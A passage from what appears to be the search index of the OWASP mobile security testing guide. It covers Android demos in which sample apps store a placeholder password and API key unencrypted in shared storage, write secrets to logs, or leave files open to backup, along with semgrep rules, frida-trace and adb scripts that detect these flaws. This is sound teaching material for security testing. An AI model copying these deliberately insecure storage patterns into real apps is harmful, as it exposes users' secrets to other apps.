languages:\n      - java\n    metadata:\n      summary: This rule scans for uses of MediaStore API that writes data to the external storage. This data can be accessed by other apps.\n    message: \"[MASVS-STORAGE] Make sure to want this data to be shared with other apps\"\n    pattern-either:\n      - pattern: import android.provider.MediaStore\n      - pattern: $X.MediaStore\n</code></pre> <p>And another one against the sample manifest file.</p> ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-manifest.yml<pre><code>rules:\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-manifest\n    severity: WARNING\n    languages:\n      - generic\n    metadata:\n      summary: This rule scans for permissions that allows your app to write to external storage or shared storage\n    message: \"[MASVS-STORAGE] Make sure to encrypt files in external storage if necessary\"\n    pattern-either:\n      - pattern: WRITE_EXTERNAL_STORAGE\n      - pattern: MANAGE_EXTERNAL_STORAGE\n      - pattern: ACCESS_ALL_EXTERNAL_STORAGE\n      - pattern: requestLegacyExternalStorage=\"true\"\n      - pattern: preserveLegacyExternalStorage=\"true\"\n      - pattern: android:requestRawExternalStorageAccess=\"true\"\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-apis.yml ./MastgTest_reversed.java --text -o output.txt\n\nNO_COLOR=true semgrep -c ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-manifest.yml ./AndroidManifest_reversed.xml --text -o output2.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0003/MASTG-DEMO-0003/#observation","title":"Observation","text":"<p>The rule has identified one location in the code file where an API, <code>getExternalStorageDirectory</code>, is used to write to external storage as well as the location in the manifest file where the <code>MANAGE_EXTERNAL_STORAGE</code> permission is declared.</p> output.txtoutput2.txt <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java \n       rules.mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-public\n          [MASVS-STORAGE] Make sure to encrypt files at these locations if necessary              \n\n           27\u2506 File externalStorageDir = Environment.getExternalStorageDirectory();\n</code></pre> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    AndroidManifest_reversed.xml \n       rules.mastg-android-data-unencrypted-shared-storage-no-user-interaction-manifest\n          [MASVS-STORAGE] Make sure to encrypt files in external storage if necessary  \n\n            2\u2506 &lt;uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\"/&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0003/MASTG-DEMO-0003/#evaluation","title":"Evaluation","text":"<p>After reviewing the decompiled code at the location specified in the output (file and line number) we can conclude that the test fails because the file written by this instance contains sensitive data, specifically a password.</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0004/MASTG-DEMO-0004/","title":"MASTG-DEMO-0004: App Writing to External Storage with Scoped Storage Restrictions","text":"<p>  Download MASTG-DEMO-0004 APK   Open MASTG-DEMO-0004 Folder  Build MASTG-DEMO-0004 APK</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0004/MASTG-DEMO-0004/#sample","title":"Sample","text":"<p>The snippet below shows sample code that creates a file in external storage using the <code>getExternalFilesDir</code> API which returns a path to the app's external files directory (e.g. <code>/storage/emulated/0/Android/data/org.owasp.mastestapp/files</code>) and does not require any permissions to access. Scoped storage applies since the app targets Android 12 (API level 31) which is higher than Android 10 (API level 29).</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        val externalStorageDir = context.getExternalFilesDir(null)\n\n        val fileName = File(externalStorageDir, \"secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteExternalStorage\", \"File written to external storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteExternalStorage\", \"Error writing file to external storage\", e)\n            return \"ERROR!!\\n\\nError writing file to external storage\"\n        }\n\n        return \"SUCCESS!!\\n\\nFile $fileName with content $fileContent saved to $externalStorageDir\"\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Log;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport kotlin.Metadata;\nimport kotlin.io.CloseableKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        File externalStorageDir = this.context.getExternalFilesDir(null);\n        File fileName = new File(externalStorageDir, \"secret.txt\");\n        try {\n            FileOutputStream fileOutputStream = new FileOutputStream(fileName);\n            FileOutputStream output = fileOutputStream;\n            byte[] bytes = \"secr3tPa$$W0rd\\n\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            output.write(bytes);\n            Log.d(\"WriteExternalStorage\", \"File written to external storage successfully.\");\n            CloseableKt.closeFinally(fileOutputStream, null);\n            return \"SUCCESS!!\\n\\nFile \" + fileName + \" with content secr3tPa$$W0rd\\n saved to \" + externalStorageDir;\n        } catch (IOException e) {\n            Log.e(\"WriteExternalStorage\", \"Error writing file to external storage\", e);\n            return \"ERROR!!\\n\\nError writing file to external storage\";\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0004/MASTG-DEMO-0004/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the reversed java code.</p> ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-apis.yml<pre><code>rules:\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-public\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that returns locations to \"external storage\" which is shared with other apps\n    message: \"[MASVS-STORAGE] Make sure to encrypt files at these locations if necessary\"\n    pattern-either:\n      - pattern: $X.getExternalStorageDirectory(...)\n      - pattern: $X.getExternalStoragePublicDirectory(...)\n      - pattern: $X.getDownloadCacheDirectory(...)\n      - pattern: Intent.ACTION_CREATE_DOCUMENT\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-scoped\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that returns locations to \"scoped external storage\"\n    message: \"[MASVS-STORAGE] These locations might be accessible to other apps on Android 10 and below given relevant permissions\"\n    pattern-either:\n      - pattern: $X.getExternalFilesDir(...)\n      - pattern: $X.getExternalFilesDirs(...)\n      - pattern: $X.getExternalCacheDir(...)\n      - pattern: $X.getExternalCacheDirs(...)\n      - pattern: $X.getExternalMediaDirs(...)\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-mediastore\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule scans for uses of MediaStore API that writes data to the external storage. This data can be accessed by other apps.\n    message: \"[MASVS-STORAGE] Make sure to want this data to be shared with other apps\"\n    pattern-either:\n      - pattern: import android.provider.MediaStore\n      - pattern: $X.MediaStore\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-apis.yml ./MastgTest_reversed.java --text -o output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0004/MASTG-DEMO-0004/#observation","title":"Observation","text":"<p>The rule has identified one location in the code file where an API, <code>getExternalFilesDir</code>, is used to write to external storage with scoped storage restrictions.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java \n       rules.mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-scoped \n          [MASVS-STORAGE] These locations might be accessible to other apps on Android 10 and below\n          given relevant permissions                                                               \n\n           25\u2506 File externalStorageDir = this.context.getExternalFilesDir(null);\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0004/MASTG-DEMO-0004/#evaluation","title":"Evaluation","text":"<p>After reviewing the decompiled code at the location specified in the output (file and line number) we can conclude that the test fails because the file written by this instance contains sensitive data, specifically a password.</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0005/MASTG-DEMO-0005/","title":"MASTG-DEMO-0005: App Writing to External Storage via the MediaStore API","text":"<p>  Download MASTG-DEMO-0005 APK   Open MASTG-DEMO-0005 Folder  Build MASTG-DEMO-0005 APK</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0005/MASTG-DEMO-0005/#sample","title":"Sample","text":"<p>The snippet below shows sample code that uses the <code>MediaStore</code> API to write a file to shared storage in a path like <code>/storage/emulated/0/Download/</code> which does not require any permissions to access and is shared with other apps.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.ContentValues\nimport android.util.Log\nimport android.content.Context\nimport android.os.Environment\nimport android.provider.MediaStore\nimport java.io.OutputStream\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        try {\n            val resolver = context.contentResolver\n            val contentValues = ContentValues().apply {\n                put(MediaStore.MediaColumns.DISPLAY_NAME, \"secretFile.txt\")\n                put(MediaStore.MediaColumns.MIME_TYPE, \"text/plain\")\n                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)\n            }\n            val textUri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)\n\n            textUri?.let {\n                val outputStream: OutputStream? = resolver.openOutputStream(it)\n                outputStream?.use {\n                    it.write(\"MAS_API_KEY=8767086b9f6f976g-a8df76\\n\".toByteArray())\n                    it.flush()\n                }\n                Log.d(\"MediaStore\", \"File written to external storage successfully.\")\n                return  \"SUCCESS!!\\n\\nMediaStore inserted to $textUri\"\n            } ?: run {\n                Log.e(\"MediaStore\", \"Error inserting URI to MediaStore.\")\n                return  \"FAILURE!!\\n\\nMediaStore couldn't insert data.\"\n            }\n        } catch (exception: Exception) {\n            Log.e(\"MediaStore\", \"Error writing file to URI from MediaStore\", exception)\n            return \"FAILURE!!\\n\\nMediaStore couldn't insert data.\"\n        }\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.ContentResolver;\nimport android.content.ContentValues;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Environment;\nimport android.provider.MediaStore;\nimport android.util.Log;\nimport java.io.OutputStream;\nimport kotlin.Metadata;\nimport kotlin.Unit;\nimport kotlin.io.CloseableKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        try {\n            ContentResolver resolver = this.context.getContentResolver();\n            ContentValues contentValues = new ContentValues();\n            contentValues.put(\"_display_name\", \"secretFile.txt\");\n            contentValues.put(\"mime_type\", \"text/plain\");\n            contentValues.put(\"relative_path\", Environment.DIRECTORY_DOCUMENTS);\n            Uri textUri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues);\n            if (textUri != null) {\n                OutputStream outputStream = resolver.openOutputStream(textUri);\n                if (outputStream != null) {\n                    OutputStream outputStream2 = outputStream;\n                    OutputStream it = outputStream2;\n                    byte[] bytes = \"MAS_API_KEY=8767086b9f6f976g-a8df76\\n\".getBytes(Charsets.UTF_8);\n                    Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n                    it.write(bytes);\n                    it.flush();\n                    Unit unit = Unit.INSTANCE;\n                    CloseableKt.closeFinally(outputStream2, null);\n                }\n                Log.d(\"MediaStore\", \"File written to external storage successfully.\");\n                return \"SUCCESS!!\\n\\nMediaStore inserted to \" + textUri;\n            }\n            MastgTest mastgTest = this;\n            Log.e(\"MediaStore\", \"Error inserting URI to MediaStore.\");\n            return \"FAILURE!!\\n\\nMediaStore couldn't insert data.\";\n        } catch (Exception exception) {\n            Log.e(\"MediaStore\", \"Error writing file to URI from MediaStore\", exception);\n            return \"FAILURE!!\\n\\nMediaStore couldn't insert data.\";\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0005/MASTG-DEMO-0005/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-apis.yml<pre><code>rules:\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-public\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that returns locations to \"external storage\" which is shared with other apps\n    message: \"[MASVS-STORAGE] Make sure to encrypt files at these locations if necessary\"\n    pattern-either:\n      - pattern: $X.getExternalStorageDirectory(...)\n      - pattern: $X.getExternalStoragePublicDirectory(...)\n      - pattern: $X.getDownloadCacheDirectory(...)\n      - pattern: Intent.ACTION_CREATE_DOCUMENT\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-scoped\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that returns locations to \"scoped external storage\"\n    message: \"[MASVS-STORAGE] These locations might be accessible to other apps on Android 10 and below given relevant permissions\"\n    pattern-either:\n      - pattern: $X.getExternalFilesDir(...)\n      - pattern: $X.getExternalFilesDirs(...)\n      - pattern: $X.getExternalCacheDir(...)\n      - pattern: $X.getExternalCacheDirs(...)\n      - pattern: $X.getExternalMediaDirs(...)\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-mediastore\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule scans for uses of MediaStore API that writes data to the external storage. This data can be accessed by other apps.\n    message: \"[MASVS-STORAGE] Make sure to want this data to be shared with other apps\"\n    pattern-either:\n      - pattern: import android.provider.MediaStore\n      - pattern: $X.MediaStore\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-apis.yml ./MastgTest_reversed.java --text -o output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0005/MASTG-DEMO-0005/#observation","title":"Observation","text":"<p>The rule has identified 2 locations that indicate a use of MediaStore API.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 2 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java \n       rules.mastg-android-data-unencrypted-shared-storage-no-user-interaction-mediastore\n          [MASVS-STORAGE] Make sure to want this data to be shared with other apps       \n\n            8\u2506 import android.provider.MediaStore;\n            \u22ee\u2506----------------------------------------\n           35\u2506 Uri textUri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues);\n</code></pre> <p>The first location is the import statement for the <code>MediaStore</code> API and the second location is where the <code>MediaStore</code> API is used to write to shared storage.</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0005/MASTG-DEMO-0005/#evaluation","title":"Evaluation","text":"<p>After reviewing the decompiled code at the locations specified in the output (file and line number) we can conclude that the test fails because the file written by this instance contains sensitive data, specifically a API key.</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0006/MASTG-DEMO-0006/","title":"MASTG-DEMO-0006: Tracing Common Logging APIs Looking for Secrets","text":"<p>  Download MASTG-DEMO-0006 APK   Open MASTG-DEMO-0006 Folder  Build MASTG-DEMO-0006 APK</p>","tags":["android","demo","MASTG-TEST-0203"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0006/MASTG-DEMO-0006/#sample","title":"Sample","text":"<p>The snippet contains many calls to logging APIs which are used to print out secrets such as passwords or IVs.</p> MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.util.logging.Logger\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        val variable = \"MAS-Sensitive-Value\"\n        val password = \"MAS-Sensitive-Password\"\n        val secret_key = \"MAS-Sensitive-Key\"\n        val IV = \"MAS-Sensitive-Value-IV\"\n        val iv = \"MAS-Sensitive-Value-IV-2\"\n\n        Log.v(\"MASTG\", \"key: $variable\")\n        Log.i(\"MASTG\", \"key: $password\")\n        Log.w(\"MASTG\", \"test: $IV\")\n        Log.d(\"MASTG\", \"test: $iv\")\n        Log.e(\"MASTG\", \"test: $variable\")\n        Log.wtf(\"MASTG\", \"test: $variable\")\n\n        val x = Logger.getLogger(\"myLogger\")\n        x.severe(secret_key)\n\n        return \"Done\"\n    }\n\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0203"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0006/MASTG-DEMO-0006/#steps","title":"Steps","text":"<p>Execute <code>frida-trace</code> against the sample app, tracing logging classes and methods.</p> run.sh<pre><code>#!/bin/bash\n\n# SUMMARY: This script uses frida-trace to trace logging statements in the specified Android app\n# and filters the output to exclude certain log methods.\n# The raw output is saved to \"output_raw.txt\" and then filtered to remove unwanted log entries.\n# The final result saved to \"output.txt\".\n\nfrida-trace \\\n    -U \\\n    -f org.owasp.mastestapp \\\n    --runtime=v8 \\\n    -j 'android.util.Log!*' \\\n    -j 'java.util.logging.Logger!severe' \\\n    -o output_raw.txt \\\n    &amp;&amp; cat output_raw.txt | grep -E \"(Log|Logger)\" | grep -vE \"Log\\.println|Log\\.isLoggable\" &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0203"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0006/MASTG-DEMO-0006/#observation","title":"Observation","text":"<p><code>frida-trace</code> has identified several instances where log output has been printed.</p> output.txt<pre><code>Log.v(\"MASTG\", \"key: MAS-Sensitive-Value\")\nLog.i(\"MASTG\", \"key: MAS-Sensitive-Password\")\nLog.w(\"MASTG\", \"test: MAS-Sensitive-Value-IV\")\nLog.d(\"MASTG\", \"test: MAS-Sensitive-Value-IV-2\")\nLog.e(\"MASTG\", \"test: MAS-Sensitive-Value\")\nLog.wtf(\"MASTG\", \"test: MAS-Sensitive-Value\")\nLog.wtf(0, \"MASTG\", \"test: MAS-Sensitive-Value\", null, false, false)\nLogger.severe(\"MAS-Sensitive-Key\")\n</code></pre> <p>As a reference, this is the corresponding logcat output obtained from Android Studio.</p> logcat_output.txt<pre><code>2024-05-14 10:30:06.864  6966-6966  MASTG                   org.owasp.mastestapp                 V  key: MAS-Sensitive-Value\n2024-05-14 10:30:06.866  6966-6966  MASTG                   org.owasp.mastestapp                 I  key: MAS-Sensitive-Password\n2024-05-14 10:30:06.867  6966-6966  MASTG                   org.owasp.mastestapp                 W  test: MAS-Sensitive-Value-IV\n2024-05-14 10:30:06.867  6966-6966  MASTG                   org.owasp.mastestapp                 D  test: MAS-Sensitive-Value-IV-2\n2024-05-14 10:30:06.867  6966-6966  MASTG                   org.owasp.mastestapp                 E  test: MAS-Sensitive-Value\n2024-05-14 10:30:06.869  6966-6966  MASTG                   org.owasp.mastestapp                 E  test: MAS-Sensitive-Value\n2024-05-14 10:30:06.881  6966-6966  myLogger                org.owasp.mastestapp                 E  MAS-Sensitive-Key\n</code></pre>","tags":["android","demo","MASTG-TEST-0203"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0006/MASTG-DEMO-0006/#evaluation","title":"Evaluation","text":"<p>Review each of the reported instances by using keywords and known secrets (e.g. passwords or usernames or values you keyed into the app).</p> <p>Note: You could refine the test to input a known secret and then search for it in the logs.</p>","tags":["android","demo","MASTG-TEST-0203"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0010/MASTG-DEMO-0010/","title":"MASTG-DEMO-0010: File System Snapshots from Internal Storage","text":"<p>  Download MASTG-DEMO-0010 APK   Open MASTG-DEMO-0010 Folder  Build MASTG-DEMO-0010 APK</p>","tags":["android","demo","MASTG-TEST-0207"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0010/MASTG-DEMO-0010/#sample","title":"Sample","text":"<p>The snippet below shows sample code that creates a file on the internal storage using using the <code>filesDir</code> property of the context object.</p> MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        mastgTestWriteIntFile()\n        return \"SUCCESS!!\\n\\nFile has been written to internal files dir\"\n    }\n\n    private fun mastgTestWriteIntFile() {\n        val internalStorageDir = context.filesDir\n        val fileName = File(internalStorageDir, \"secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteInternalStorage\", \"Error writing file to internal storage\", e)\n        }\n    }\n\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0207"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0010/MASTG-DEMO-0010/#steps","title":"Steps","text":"<ol> <li>Install an app on your device.</li> <li>Execute <code>run_before.sh</code> which runs  adb.</li> <li>Open an app and exercise it to trigger file creations.</li> <li>Execute <code>run_after.sh</code>.</li> <li>Close the app once you finish testing.</li> </ol> run_before.shrun_after.sh <pre><code>#!/bin/bash\n\n# SUMMARY: This script creates a dummy file to mark a timestamp that we can use later\n# on to identify files created while the app was being exercised\n\nadb shell \"touch /data/local/tmp/test_start\"\n</code></pre> <pre><code>#!/bin/bash\n\n# SUMMARY: List all files created after the creation date of a file created in run_before\n\nadb shell \"find /data/user/0/org.owasp.mastestapp/ -type f -newer /data/local/tmp/test_start\" &gt; output.txt\nadb shell \"rm /data/local/tmp/test_start\"\nmkdir -p new_files\nwhile read -r line; do\n  adb pull \"$line\" ./new_files/\ndone &lt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0207"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0010/MASTG-DEMO-0010/#observation","title":"Observation","text":"<p>There is a list of all created files inside <code>output.txt</code>.</p> output.txt<pre><code>/data/user/0/org.owasp.mastestapp/files/secret.txt\n</code></pre> <p>Their content is inside the <code>./new_files/</code> directory and contains:</p> <p>A password:</p> new_files/secret.txt<pre><code>secr3tPa$$W0rd\n</code></pre> <p>The file was created in <code>/data/user/0/org.owasp.mastestapp/files/</code> which is equivalent to <code>/data/data/org.owasp.mastestapp/files/</code>.</p>","tags":["android","demo","MASTG-TEST-0207"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0010/MASTG-DEMO-0010/#evaluation","title":"Evaluation","text":"<p>This test fails because the file is not encrypted and contains sensitive data (a password). You can further confirm this by reverse engineering the app and inspecting the code.</p>","tags":["android","demo","MASTG-TEST-0207"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0020/MASTG-DEMO-0020/","title":"MASTG-DEMO-0020: Data Exclusion using backup_rules.xml with Backup Manager","text":"<p>  Download MASTG-DEMO-0020 APK   Open MASTG-DEMO-0020 Folder  Build MASTG-DEMO-0020 APK</p>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0020/MASTG-DEMO-0020/#sample","title":"Sample","text":"<p>The following samples contain:</p> <ul> <li>the Kotlin code that creates two files inside <code>filesDir</code>.</li> <li>the AndroidManifest.xml with the <code>android:fullBackupContent</code> attribute (for Android 11 and lower).</li> <li>the <code>backup_rules.xml</code> file including a rule to exclude one of the files using an <code>&lt;exclude&gt;</code> element.</li> </ul> MastgTest.ktAndroidManifest.xmlbackup_rules.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        val internalStorageDir = context.filesDir\n\n        val fileName = File(internalStorageDir, \"secret.txt\")\n        val fileNameOfBackupExcludedFile = File(internalStorageDir, \"backup_excluded_secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n            FileOutputStream(fileNameOfBackupExcludedFile).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteInternalStorage\", \"Error writing file to internal storage\", e)\n            return \"ERROR!!\\n\\nError writing file to internal storage\"\n        }\n\n        return \"SUCCESS!!\\n\\nFiles saved to $internalStorageDir\"\n    }\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            